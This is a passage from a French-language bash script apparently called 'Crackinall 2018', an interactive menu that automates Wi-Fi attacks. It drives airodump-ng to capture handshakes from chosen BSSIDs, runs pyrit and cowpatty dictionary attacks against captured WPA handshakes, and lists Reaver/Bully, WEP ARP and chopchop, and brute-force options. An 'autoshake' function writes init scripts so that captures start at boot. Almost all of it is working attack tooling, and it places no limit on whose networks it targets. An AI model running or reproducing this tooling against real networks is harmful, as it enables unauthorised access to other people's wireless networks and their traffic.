echo -e "\033[32m\033[1m=> FORMAT FICHIER CAP UTILISE : [/root/fichierscap/$fichier_cap-0x.cap]\033[0m"
echo 
echo -e " \033[33m\033[1m=> Choix du canal :\033[0m " 
echo
read var_canal 
echo	
################## limitation des réponses utilisateurs var_canal
lim_varcanal
################## limitation des réponses utilisateurs var_canal

echo
echo -e " \033[33m\033[1m=> Choix de l'interface :\033[0m " 
echo

################# limitation des réponses utilisateurs var_interface 
lim_interfaces
################# limitation des réponses utilisateurs var_interface

echo
echo -e " \033[33m\033[1m=> Passage en mode moniteur... \033[0m" 
echo
echo -e " \033[33m\033[1m=> Mode moniteur \033[32m\033[1mOK\033[0m" 


echo
xterm -T "$var_canal / $var_encrypt / $var_interface $fichier_cap" -e "airodump-ng -w /root/fichierscap/$fichier_cap --bssid $bssid -c $var_canal -W $var_interface; $SHELL" & 

################# Génération des logs
echo -e " Ecoute spécifique - Génération des logs : " >> $var_log
echo >> $var_log
echo -e "$bssid $var_interface $var_canal $fichier_cap" >> $var_log
################# Génération des logs

echo
echo -e " \033[33m\033[1m=> Choix d'un nouveau BSSID pour l'écoute ? [Y/n]\033[0m "
echo
read suivant

################ Limitation des choix utilisateurs suivant
lim_varsuivant
################ Limitation des choix utilisateurs suivant

	while [[ $suivant == "Y" ]]; do

		echo
		echo -e " \033[33m\033[1m=> Choix du BSSID ? [Format accepté : XX:XX:XX:XX:XX:XX]\033[0m " 
		echo
		read bssid 

		################# limitation des réponses utilisateurs bssid
		lim_bssid
		################# limitation des réponses utilisateurs bssid

		echo
		echo -e "\033[32m\033[1m=> OUVERTURE D'UNE NOUVELE FENETRE D'ECOUTE : \033[0m"

		xterm -T "$var_canal / $var_encrypt / $var_interface $fichier_cap" -e "airodump-ng -w /root/fichierscap/$fichier_cap --bssid $bssid -c $var_canal -W $var_interface; $SHELL" & 

		################# Génération des logs
		echo -e " Ecoute spécifique - Génération des logs : " >> $var_log
		echo >> $var_log
		echo -e "$bssid $var_interface $var_canal $fichier_cap" >> $var_log
		################# Génération des logs

		echo 
		echo -e "\033[33m\033[1m=> Choix d'un nouveau BSSID ? [Y/n]\033[0m"
		echo
		read suivant
		################ Limitation des choix utilisateurs suivant
		lim_varsuivant
		################ Limitation des choix utilisateurs suivant
	done
	echo
}

function lim_general {

################################################### Lancement écoute générale #########################################################################

echo
echo -e "$intro_info"

		################ Arrêt des processus parasites
		echo
		echo -e " \033[32m\033[1m=> LANCEMENT DES ECOUTES GENERALES :  \033[0m"
		echo		
		echo
		echo -e " \033[34m\033[1m=> Arrêt des processus parasites...\033[0m"
		airmon-ng check kill
		echo -e " \033[33m\033[1m=> Arrêt processus \033[32m\033[1mOK\033[0m"
		################ Arrêt des processus parasites


		################################### Interface + mode moniteur + gestion des erreurs ##################################################
		echo
		echo -e " \033[32m\033[1m=> MENU INTERFACES : \033[0m" 
		echo 
		airmon-ng
		echo
		echo -e " \033[33m\033[1m=> Choix de l'interface : \033[0m" 
		echo
		lim_interfaces
		echo
		echo -e " \033[33m\033[1m=> Passage en mode moniteur... \033[0m" 
		echo
		echo -e " \033[33m\033[1m=> Mode moniteur \033[32m\033[1mOK\033[0m" 
		################################### Gestion des erreurs Mode Moniteur ################################################################
		
		################ Changer puissance d'écoute
		echo
		echo -e " \033[33m\033[1m=> Voulez - vous augmenter la puissance d'écoute [valeur/n] ? \033[0m" 
		echo
		lim_txpower
		echo
		iwconfig 
		echo
		################ Changer puissance d'écoute

		################ Changer fréquence interface WIFI
		echo
		echo -e " \033[33m\033[1m=> Fréquence d'écoute $var_interface [ Format accepté : x.xG ou x.xxG ou x.xxxG - n pour quitter ] ?: \033[0m" 
		echo 
		echo -e "Liste fréquences $var_interface"  >> /root/crackilogs/liste_freq.txt
		echo >> /root/crackilogs/liste_freq.txt
		echo -e "iwlist $var_interface frequency" >> /root/crackilogs/liste_freq.txt
		echo
		lim_freq
		echo
		iwconfig 
		echo
		################ Changer fréquence interface WIFI


echo
echo -e " \033[33m\033[1m=> Choix du canal d'écoute ?\033[0m " 
echo
echo -e "Liste canaux $var_interface"  >> /root/crackilogs/liste_channel.txt
echo >> /root/crackilogs/liste_channel.txt
echo -e "iwlist $var_interface channel" >> /root/crackilogs/liste_channel.txt
echo
read var_canal 

############## limitation des réponses utilisateurs 
lim_varcanal
############## limitation des réponses utilisateurs 

echo

############## Choix du protocole d'écoute + limitation des réponses utilisateurs 

echo -e " \033[33m\033[1m=> Choix du protocole ?\033[0m "
echo
read var_encrypt
echo

############## limitation des réponses utilisateurs
lim_varencrypt
############## limitation des réponses utilisateurs

echo
echo -e " \033[33m\033[1m=> Protocole \033[32m\033[1mOK\033[0m"
echo
echo -e " \033[33m\033[1m=> Capacité écoute réseau \033[32m\033[1mOK\033[0m"
echo

echo -e " \033[33m\033[1m=> Modifier paramètres canal / protocole / interface d'écoute ? [n/Y]\033[0m " 
echo
read var_change

if [ $var_change = "Y" ] ; then

##############  limitation des réponses utilisateurs var_change 
var_change
##############  limitation des réponses utilisateurs var_change 

echo

PS3="Faites votre choix : "
echo

select choix in \
   "$intro_menu" \
	
do
   case $REPLY in

1)
		echo
		echo -e "\033[1mModification Interace WIFI [wlan0, wlan1, wlanx...]:\033[0m"       
		echo
		echo -e " \033[33m\033[1m=> Choix de l'interface [wlan1, wlan2, wlanx...] ?\033[0m  "


		#################### Limitation des réponses utilisateurs var_interface
		lim_interfaces
		echo -e " \033[33m\033[1m=> Passage en mode moniteur... \033[0m" 
		echo
		echo -e " \033[33m\033[1m=> Mode moniteur \033[32m\033[1mOK\033[0m" 
		#################### Limitation des réponses utilisateurs var_interface


		xterm -T "$var_canal / $var_encrypt / $var_interface" -e "airodump-ng --encrypt $var_encrypt -c $var_canal --berlin 10 -W $var_interface; $SHELL" &
		
		echo ;;

2)
		echo	
		echo "\033[1mModication protocole d'écoute [WPA/WEP] : \033[0m "
		echo
		echo -e " \033[33m\033[1m=> Choix du protocole [WEP/WPA] ? \033[0m "
		echo
		read var_encrypt
		xterm -T "$var_canal / $var_encrypt / $var_interface" -e "airodump-ng --encrypt $var_encrypt -c $var_canal --berlin 10 -W $var_interface; $SHELL" &
		echo

		############## Limitation des réponses utilisateurs var_encrypt 
		lim_varencrypt
		############## Limitation des réponses utilisateurs var_encrypt 
		
		echo ;;

 
3)	echo
	echo -e " \033[33m\033[1m=> Choix du canal d'écoute : \033[0m "
	echo
	read var_canal
	echo

	############## Limitation des réponses utilisateurs var_canal 
	lim_varcanal
	############## Limitation des réponses utilisateurs var_canal 

	xterm -T "$var_canal / $var_encrypt / $var_interface" -e "airodump-ng --encrypt $var_encrypt -c $var_canal --berlin 10 -W $var_interface; $SHELL" & ;;
4)

	echo "Continuer sans modifications..."  
	xterm -T "$var_canal / $var_encrypt / $var_interface" -e "airodump-ng --encrypt $var_encrypt -c $var_canal --berlin 10 -W $var_interface; $SHELL" &
	break ;;

*) 

	echo -e "\033[1mChoix impossible, veuillez ressayer...\033[0m"
	esac
done

else
	echo
	xterm -T "$var_canal / $var_encrypt / $var_interface" -e "airodump-ng --encrypt $var_encrypt -c $var_canal --berlin 10 -W $var_interface; $SHELL" &
fi

}

function lim_crackinall {

echo
echo -e "\033[33m\033[1m=> Lancer Crackinall.sh [Y/n] ?\033[0m "
echo
read suivant
echo

############## limitation des réponses utilisateurs var_reaver
lim_varsuivant
############## limitation des réponses utilisateurs var_reaver

while [ $suivant == "Y" ]; do
	xterm -T "Crackinall" -e "crackinall.sh"

	echo -e "\033[33m\033[1m=> Relancer Crackinall / Revenir au menu principal [Y/n] ?\033[0m "
	echo
	read suivant
	echo 

	############## limitation des réponses utilisateurs var_reaver
	lim_varsuivant
	############## limitation des réponses utilisateurs var_reaver

done

}

function lim_pyrit {

echo
echo -e "$intro93" 	
echo
echo -e " \033[33m\033[1m=> Liste des fichiers cap valides [Format accepté : XXXXX]\033[0m " 
echo
ls /root/fichierscap/*.cap
echo
echo -e " \033[33m\033[1m=> Choix du fichier cap (chemin prérempli, avec extension...)- exemple XXXXX-0x.cap\033[0m"
echo 	
read fichier_cap 
echo

############### Limitation du choix utilisateur pour $fichier_cap
lim_cap2
############### Limitation du choix utilisateur pour $fichier_cap

echo -e " \033[32m\033[1m=> CHOIX DES FICHIERS DICTIONNAIRES POUR L'ATTAQUE :  \033[0m " 
echo 

echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/lourds]\033[0m " 
echo
ls /root/Dictionnaires/lourds
echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/mini]\033[0m " 
echo
ls /root/Dictionnaires/mini
echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/moyens]\033[0m " 
echo
ls /root/Dictionnaires/moyens
echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/petits]\033[0m " 
echo
ls /root/Dictionnaires/petits
echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2giga]\033[0m " 
echo
ls /root/Dictionnaires/rdy2giga
echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2use]\033[0m " 
echo
ls /root/Dictionnaires/rdy2use
echo
echo -e " \033[33m\033[1m=> Choix du fichier dictionnaire (chemin complet !)\033[0m"
echo
read dico
echo

pyrit -r /root/fichierscap/$fichier_cap -i $dico attack_passthrough
var_code=$?
echo $var_code
echo

while [[ ! $var_code == 0 ]]; do

	echo -e "\033[36m\033[1m => Dictionnaire non valide, veuillez refaire votre choix : \033[0m"
	echo 
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/lourds]\033[0m " 
	echo
	ls /root/Dictionnaires/lourds
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/mini]\033[0m " 
	echo
	ls /root/Dictionnaires/mini
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/moyens]\033[0m " 
	echo
	ls /root/Dictionnaires/moyens
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/petits]\033[0m " 
	echo
	ls /root/Dictionnaires/petits
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2giga]\033[0m " 
	echo
	ls /root/Dictionnaires/rdy2giga
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2use]\033[0m " 
	echo
	ls /root/Dictionnaires/rdy2use
	echo
	echo -e " \033[33m\033[1m=> Choix du fichier dictionnaire (chemin complet !)\033[0m"
	echo

	read dico
	echo

	pyrit -r /root/fichierscap/$fichier_cap -i $dico attack_passthrough
	var_code=$?
	echo
done


}

function lim_pyrit_db_essids {

echo
echo -e "$intro92" 	
echo
echo -e " \033[32m\033[1m=> IMPORT DE L'ESSID :\033[0m " 
echo
echo -e " \033[33m\033[1m=> Liste des fichiers cap valides [Format accepté : XXXXX]\033[0m " 
echo
ls /root/fichierscap/*.cap
echo
echo -e " \033[33m\033[1m=> Choix du fichier cap pour analyse pyrit et extraction ESSID (chemin prérempli, avec extension...) - exemple XXXXX-0x.cap\033[0m"
echo 	
read fichier_cap 
echo

############### Limitation du choix utilisateur pour $fichier_cap
lim_cap2
############### Limitation du choix utilisateur pour $fichier_cap

pyrit -r /root/fichierscap/$fichier_cap analyze
var_code=$?
echo $var_code
echo

while [[ ! $var_code == 0 ]]; do
	echo
	echo -e "\033[36m\033[1m => Handshake non valide, fichier cap inutilisable...\033[0m"
	echo
	echo -e " \033[33m\033[1m=> Choix du fichier cap pour analyse pyrit et extraction ESSID (chemin prérempli, avec extension...)- exemple 	XXXXX-0x.cap\033[0m"
	echo
	read fichier_cap
	pyrit -r /root/fichierscap/$fichier_cap analyze
	var_code=$?
done
			

echo
echo -e " \033[33m\033[1m=> Choix de l'ESSID : \033[0m " 
echo
echo -e "\033[34m\033[1m [Astuce : Si l'ESSID contient des espaces, alors format commande [pyrit -e 'essid_espace' create_essid]]\033[0m"
echo
read essid 
echo

pyrit -e $essid create_essid
var_code=$?

echo	
echo $var_code
echo

while [[ ! $var_code == 0 ]]; do

	echo -e "\033[36m\033[1m => ESSID non valide, veuillez refaire votre choix : \033[0m"
	echo 
	read essid
	pyrit -e $essid create_essid
	var_code=$?
	echo
done 

echo
echo -e " \033[32m\033[1m=> IMPORT DE l'ESSID DANS LA BASE DE DONNEE PYRIT OK \033[0m " 
echo 

echo -e " \033[33m\033[1m=> Voulez - vous importer d'autres ESSID dans la base de donnée [Y/n] ? \033[0m " 
echo
echo -e "\033[34m\033[1m [Astuce : Si l'ESSID contient des espaces, alors format commande [pyrit -e 'essid_espace' create_essid]]\033[0m"
echo
read suivant
echo

############## limitation des réponses utilisateurs var_suivant
lim_varsuivant
############## limitation des réponses utilisateurs var_suivant

echo

	while [[ $suivant == "Y" ]]; do

		echo
		echo -e " \033[33m\033[1m=> Liste des fichiers cap valides [Format accepté : XXXXX] : \033[0m " 
		echo
		ls /root/fichierscap/*.cap
		echo
		echo -e " \033[33m\033[1m=> Choix du fichier cap pour analyse pyrit et extraction ESSID (chemin prérempli, avec extension...)- exemple XXXXX-0x.cap\033[0m"
		echo 	
		read fichier_cap 
		echo

		############### Limitation du choix utilisateur pour $fichier_cap
		lim_cap2
		############### Limitation du choix utilisateur pour $fichier_cap

		echo
		pyrit -r /root/fichierscap/$fichier_cap analyze
		var_code=$?
		echo $var_code
		echo

		while [[ ! $var_code == 0 ]]; do
			echo
			echo -e "\033[36m\033[1m => Handshake non valide, fichier cap inutilisable...\033[0m"
			echo
			echo -e " \033[33m\033[1m=> Choix du fichier cap pour analyse pyrit et extraction ESSID (chemin prérempli, avec extension...)- exemple XXXXX-0x.cap\033[0m"
			echo
			read fichier_cap
			pyrit -r /root/fichierscap/$fichier_cap analyze
			var_code=$?
		done

	echo
	echo -e " \033[33m\033[1m=> Choix de l'ESSID : \033[0m " 
	echo
	read essid
	echo
	pyrit -e $essid create_essid
	var_code=$?
	echo	
	echo $var_code
	echo

	while [[ ! $var_code == 0 ]]; do

		echo -e "\033[36m\033[1m => ESSID non valide, veuillez refaire votre choix : \033[0m"
		echo 
		read essid
		pyrit -e $essid create_essid
		var_code=$?
		echo

	done
	
	echo
	echo -e "\033[33m\033[1m => CONTINUER A IMPORTER DES ESSIDS [Y/n] ?\033[0m" 
	echo
	read suivant
	echo
	############## limitation des réponses utilisateurs var_suivant
	lim_varsuivant
	############## limitation des réponses utilisateurs var_suivant
	echo
	done

}

function lim_pyrit_db_dicos {

###### Import des fichiers dictionnaires dans la base de donnée Pyrit
echo
echo -e " \033[32m\033[1m=> CHOIX DES FICHIERS DICTIONNAIRES POUR L'ATTAQUE :  \033[0m " 
echo 
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/lourds]\033[0m " 
echo
ls /root/Dictionnaires/lourds
echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/mini]\033[0m " 
echo
ls /root/Dictionnaires/mini
echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/moyens]\033[0m " 
echo
ls /root/Dictionnaires/moyens
echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/petits]\033[0m " 
echo
ls /root/Dictionnaires/petits
echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2giga]\033[0m " 
echo
ls /root/Dictionnaires/rdy2giga
echo
echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2use]\033[0m " 
echo
ls /root/Dictionnaires/rdy2use
echo
echo -e " \033[33m\033[1m=> Choix du fichier dictionnaire (chemin complet !)\033[0m"
echo
read dico
echo

pyrit -i $dico import_passwords
var_code=$?

echo	
echo $var_code
echo

while [[ ! $var_code == 0 ]]; do

	echo
	echo -e "\033[36m\033[1m => Dictionnaire non valide ou passphrase non incluse dans le dictionnaire sélectionné, veuillez refaire votre choix :\033[0m"
	echo 
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/lourds]\033[0m " 
	echo
	ls /root/Dictionnaires/lourds
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/mini]\033[0m " 
	echo
	ls /root/Dictionnaires/mini
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/moyens]\033[0m " 
	echo
	ls /root/Dictionnaires/moyens
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/petits]\033[0m " 
	echo
	ls /root/Dictionnaires/petits
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2giga]\033[0m " 
	echo
	ls /root/Dictionnaires/rdy2giga
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2use]\033[0m " 
	echo
	ls /root/Dictionnaires/rdy2use
	echo
	echo -e " \033[33m\033[1m=> Choix du fichier dictionnaire (chemin complet !)\033[0m"
	echo
	read dico
	pyrit -i $dico import_passwords
	var_code=$?
	echo
done

echo
echo -e "\033[34m\033[1m => AJOUT D'AUTRES DICTIONNAIRES DANS LA BDD PYRIT [Y/n] ?\033[0m"
echo 
read suivant
echo
############## limitation des réponses utilisateurs var_reaver
lim_varsuivant
############## limitation des réponses utilisateurs var_reaver

while [[ $suivant == "Y" ]]; do
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/lourds]\033[0m " 
	echo
	ls /root/Dictionnaires/lourds
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/mini]\033[0m " 
	echo
	ls /root/Dictionnaires/mini
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/moyens]\033[0m " 
	echo
	ls /root/Dictionnaires/moyens
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/petits]\033[0m " 
	echo
	ls /root/Dictionnaires/petits
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2giga]\033[0m " 
	echo
	ls /root/Dictionnaires/rdy2giga
	echo
	echo -e " \033[33m\033[1m=> Liste des dictionnaires disponibles [/root/Dictionnaires/rdy2use]\033[0m " 
	echo
	ls /root/Dictionnaires/rdy2use
	echo
	echo -e " \033[33m\033[1m=> Choix du fichier dictionnaire (chemin complet !)\033[0m"
	echo
	read dico
	pyrit -i $dico import_passwords
	echo
	read suivant
done
###### Import des fichiers dictionnaires dans la base de donnée Pyrit
}

function lim_pyrit_db_batch {

###### Batch de la base de donnée Pyrit
echo
echo -e " \033[33m\033[1mPyrit - Création des tables avec la commande batch, cette commande peut prendre du temps et solliciter énormément de ressources CPU et GPU selon la taille du fichier dictionnaire, voulez - vous continuer [Y/n] ? \033[0m " 
echo
read suivant
echo

################ Limitation des choix utilisateurs suivant
lim_varsuivant
################ Limitation des choix utilisateurs suivant

if [[ $suivant == "Y" ]]; then

	echo
	pyrit batch
else
	echo -e "\033[36m\033[1m=> Retour au menu principal ### \033[0m"
	echo
fi

}
###### Batch de la base de donnée Pyrit

###### Attack pyrit DB
function lim_pyrit_attackdb {

echo
echo -e "\033[34m\033[1m[Astuce : Il est impératif d'avoir importer l'ESSID correspondant au fichier cap à choisir pour cette étape, se reporter à l'étape 11 du Menu...]\033[0m"
echo
echo -e "$intro91" 	
echo
echo -e " \033[33m\033[1m=> Liste des fichiers cap valides [Format accepté : XXXXX]\033[0m " 
echo
ls /root/fichierscap/*.cap
echo
echo -e " \033[33m\033[1m=> Choix du fichier cap (chemin prérempli, avec extension...) - exemple XXXXX-0x.cap\033[0m"
echo 	
read fichier_cap 
echo

############### Limitation du choix utilisateur pour $fichier_cap
lim_cap2
############### Limitation du choix utilisateur pour $fichier_cap

pyrit -r /root/fichierscap/$fichier_cap attack_db

var_code=$?

echo	
echo $var_code
echo

while [[ ! $var_code == 0 ]]; do

	echo -e "\033[36m\033[1m=> Attaque échouée. Veuillez choisir un autre fichier cap : \033[0m"
	echo 
	echo -e "\033[36m\033[1m=> Choix du fichier cap (chemin prérempli, avec extension...) - exemple XXXXX-0x.cap[\033[0m"
	echo
	read fichier_cap
	echo
	pyrit -r /root/fichierscap/$fichier_cap attack_db
	var_code=$?
	echo
done

}
###### Attack pyrit DB

###### Attack pyrit cowpatty
function lim_pyrit_cowpatty {

echo -e "$intro90" 	

echo
echo -e " \033[33m\033[1m=> Choix du fichier d'extraction .Cow [Format XXXX.out ]\033[0m " 
echo
echo
echo -e " \033[33m\033[1m=> Liste des fichiers cow déjà créés dans /root/fichierscow/*.out : \033[0m " 
echo
ls /root/fichierscow/*.out
echo
read fichier_cow
echo
############### Limitation du choix utilisateur pour $fichier_cap
lim_cow
############### Limitation du choix utilisateur pour $fichier_cap

echo
echo -e " \033[33m\033[1m=> Liste des fichiers cap valides [Format accepté : XXXXX]\033[0m " 
echo
ls /root/fichierscap/*.cap
echo
echo -e " \033[33m\033[1m=> Choix du fichier cap (chemin prérempli, avec extension...)- exemple XXXXX-0x.cap\033[0m"
echo 	
read fichier_cap 
echo

############### Limitation du choix utilisateur pour $fichier_cap
lim_cap2
############### Limitation du choix utilisateur pour $fichier_cap

pyrit -r /root/fichierscap/$fichier_cap analyze
var_code=$?
echo $var_code
echo

while [[ ! $var_code == 0 ]]; do
	echo
	echo -e "\033[36m\033[1m => Handshake non valide, fichier cap inutilisable...\033[0m"
	echo
	read fichier_cap
	echo
	pyrit -r /root/fichierscap/$fichier_cap analyze
	var_code=$?
done

echo
echo -e " \033[33m\033[1m=> Choix de l'ESSID : \033[0m " 
echo
echo -e "\033[34m\033[1m [Astuce : Si l'ESSID contient des espaces, alors format commande [ 'essid espace' ]]\033[0m"
echo
read essid 
echo

pyrit -e $essid -o /root/fichierscow/$fichier_cow export_cowpatty
var_code=$?

while [[ ! $var_code == 0 ]]; do

	echo -e "\033[36m\033[1m => Attaque échouée, sélectionnez un autre ESSID ou un autre fichier cow de sortie...\033[0m"
	echo 
	echo -e "\033[33m\033[1m => Sélection d'un nouvel ESSID : \033[0m"
	echo
	read essid
	echo
	echo -e "\033[33m\033[1m => Sélection d'un nouveau fichier cow de sortie : \033[0m"
	echo 
	ls /root/fichierscow/*.out
	echo
	read fichier_cow
	echo
	read fichier_cow
	echo
	pyrit -e $essid -o /root/fichierscow/$fichier_cow export_cowpatty
	var_code=$?
done

echo
cowpatty -d /root/fichierscow/$fichier_cow -s $essid -r /root/fichierscap/$fichier_cap
var_code=$?
echo $var_code
echo

while [[ ! $var_code == 0 ]]; do

	echo -e "\033[36m\033[1m => Attaque échouée, sélectionnez un autre ESSID, un autre fichier cow de sortie ou un autre fichier cap....\033[0m"
	echo 
	echo -e "\033[33m\033[1m => Sélection d'un nouvel ESSID : \033[0m"
	echo
	read essid
	echo
	echo -e "\033[33m\033[1m => Sélection d'un nouveau fichier cow de sortie : \033[0m"
	echo 
	ls /root/fichierscow/*.out
	echo
	read fichier_cow
	echo
	echo -e " \033[33m\033[1m=> Liste des fichiers cap valides [Format accepté : XXXXX]\033[0m " 
	echo
	ls /root/fichierscap/*.cap
	echo
	read fichier_cap
	echo
	cowpatty -d /root/fichierscow/$fichier_cow -s $essid -r /root/fichierscap/$fichier_cap
	var_code=$?
done

}

###### Attack pyrit cowpatty

###### Autoshake

function lim_autoshake {

echo
echo -e "$intro101"
echo
echo -e "$intro102"
echo
echo -e "\033[32m\033[1m AUTOSHAKE : ECOUTE GENERALE AUTOMATIQUE AU DEMARRAGE DE KALI LINUX\033[0m  "
echo
echo -e " \033[1mVoulez - vous lancer autoshake au prochain démarrage [Y/n] ?\033[0m " 
echo
read suivant
echo

################ Limitation des choix utilisateurs suivant
lim_varsuivant
################ Limitation des choix utilisateurs suivant

while [[ $suivant == "Y" ]]; do

	echo -e "$intro101"
	echo
	echo
	echo -e "\033[32m\033[1m CREATION DU SERVICE AUTOSHAKE DANS LE REPERTOIRE DE DEMARRAGE [/etc/init.D]\033[0m " 
	echo
	echo -e " \033[33m\033[1m=> Choix du fichier cap [Format accepté : XXXXX.cap] : \033[0m"
	echo 	
	read fichier_cap 
	echo
	############### Limitation du choix utilisateur pour $fichier_cap
	lim_cap1
	############### Limitation du choix utilisateur pour $fichier_cap
	echo
	echo -e " \033[33m\033[1m=> Choix du canal pour la première écoute ?\033[0m "
	echo
	read var_canal
	echo
	###################### limitation des réponses utilisateurs var_canal
	lim_varcanal
	###################### limitation des réponses utilisateurs var_canal
	echo
	echo -e " \033[33m\033[1m=> Choix du canal pour la deuxième écoute ?\033[0m "
	echo
	read var_canal2
	echo
	###################### limitation des réponses utilisateurs var_canal
	lim_varcanal
	###################### limitation des réponses utilisateurs var_canal
	echo
	echo -e " \033[33m\033[1m=> Choix de l'interface pour la première écoute ? \033[0m " 
	echo
	################# limitation des réponses utilisateurs var_interface 
	lim_interfaces
	################# limitation des réponses utilisateurs var_interface
	echo
	echo -e " \033[33m\033[1m=> Choix de l'interface pour la deuxième écoute ? \033[0m " 
	echo
	################# limitation des réponses utilisateurs var_interface 
	lim_interfaces2
	################# limitation des réponses utilisateurs var_interface
	echo

	echo -e " \033[33m\033[1m=> Nom du dossier dans lequel sera stocké le service [ Exemple : /root OR /etc/init.d ] ? \033[0m " 
	echo
	read var_dossier
	echo

	echo -e " \033[33m\033[1m=> Nom du fichier / service [sans extension car pré-remplie / .sh ] ? \033[0m " 
	echo
	read var_fichier
	echo

	echo -e "#!/bin/bash" >> $var_dossier/$var_fichier.sh
	echo -e "### BEGIN INIT INFO" >> $var_dossier/$var_fichier.sh
	echo -e "# Provides:          Nom du script" >> $var_dossier/$var_fichier.sh
	echo -e "# Required-Start:    $local_fs $network" >> $var_dossier/$var_fichier.sh
	echo -e "# Required-Stop:     $local_fs" >> $var_dossier/$var_fichier.sh
	echo -e "# Default-Start:     2 3 4 5" >> $var_dossier/$var_fichier.sh
	echo -e "# Default-Stop:      0 1 6" >> $var_dossier/$var_fichier.sh
	echo -e "# Short-Description: Description courte" >> $var_dossier/$var_fichier.sh
	echo -e "# Description:       Description longue" >> $var_dossier/$var_fichier.sh
	echo -e "### END INIT INFO" >> $var_dossier/$var_fichier.sh
	echo >> $var_dossier/$var_fichier.sh
	echo -e "airodump-ng -w /root/fichierscap/$fichier_cap -c $var_canal -W $var_interface" >> $var_dossier/$var_fichier.sh
	echo -e "sleep 5m" >> $var_dossier/$var_fichier.sh
	echo -e "airodump-ng -w /root/fichierscap/$fichier_cap -c $var_canal2 -W $var_interface2" >> $var_dossier/$var_fichier.sh
	chmod +x $var_dossier/$var_fichier.sh

	echo
	echo -e "\033[32m\033[1m SERVICE STOCKE DANS $var_dossier/$var_fichier.sh OK \033[0m"
	echo
	echo -e "\033[32m\033[1m OPTION POUR LANCEMENT AUTOMATIQUE AU DEMARRAGE DE KALI \033[0m"
	echo
	echo -e "\033[33m\033[1m=> Sélection du RUNLEVEL [ 1 à 6 | 2 - Démarrage normal, recommandé ] \033[0m"
	echo
	read runlevel
	echo

	################ Limitation des choix utilisateurs suivant
	lim_runlevel
	################ Limitation des choix utilisateurs suivant

	echo
	echo -e "\033[32m\033[1m=> Chemin du service disponible : /etc/rc$runlevel.d/ \033[0m"
	echo
	#mkdir $var_dossier/rc$runlevel.d
	echo -e "Welcome to autoshake GUI-Crackinall service"  >> /etc/rc$runlevel.d/S01$var_fichier.sh
	echo
	echo -e "\033[32m\033[1m AUTOSHAKE OK, LANCEMENT DES ECOUTES AU PROCHAIN DEMARRAGE\033[0m"
	echo
	echo -e "\033[33m\033[1m => Lancer d'autres écoutes au démarrage de Kali [Y/n] ?\033[0m "
	echo	
	read suivant
	echo
	################ Limitation des choix utilisateurs suivant
	lim_varsuivant
	################ Limitation des choix utilisateurs suivant
	echo
done

}
 
###### Autoshake


###################################################### Début script ############################################################################

intro_info="\033[34m\033[1mCe menu vous permet de lancer une ou plusieurs écoutes en fonction des attaques envisagées. 
Il est indispensable pour définir les paramètres (BSSID, ESSID, Canal, Interface d'écoute, Station etc) nécessaires à la suite du script.\033[0m"

intro_menu99=" 

Que voulez - vous faire ? 
                                                          
1) AIRODUMP-NG | ECOUTE GENERALE SUR CANAUX
2) AIRODUMP-NG | ECOUTE SPECIFIQUE
3) AUTOSHAKE   | ECOUTES AUTOMATIQUES AU DEMARRAGE
4) HANDSHAKE   | RECUPERATION DU HANDSHAKE		    
5) REAVER / BULLY 				    
6) WEP | ARP					    
7) WEP | CHOPCHOP			    	    
8) WPA | BRUTEFORCE                                 
9) WPA | DICTIONNAIRE 
10) PYRIT | PASSTHROUGH 
11) PYRIT | DB | Add ESSIDs 
12) PYRIT | DB | Add Dicos
13) PYRIT | DB | Batch
14) PYRIT | DB
15) PYRIT + COWPATTY       			    
16) CAPCLEANER
17) EXIT	            				    

 "

echo -e "$intro100"
echo
echo -e "$intro10"
figlet -c "Crackinall 2018"
PS3="Faites votre choix : "
echo

select choix in \
   "$intro_menu99" \
	
do
   case $REPLY in

1)

lim_general
;;

2)

lim_spec
;;

3) 

lim_autoshake
;;

4)

lim_handshake
;;

5)

lim_freaver
;;
 
6)

lim_arp
;;

7)

lim_chopchop
;;

8)

lim_bruteforce
;;

9)

lim_attack_dico 
;;

10) 

lim_pyrit
;;

11)

lim_pyrit_db_essids
;;

12)

lim_pyrit_db_dicos
;;

13)

lim_pyrit_db_batch
;;

14) 

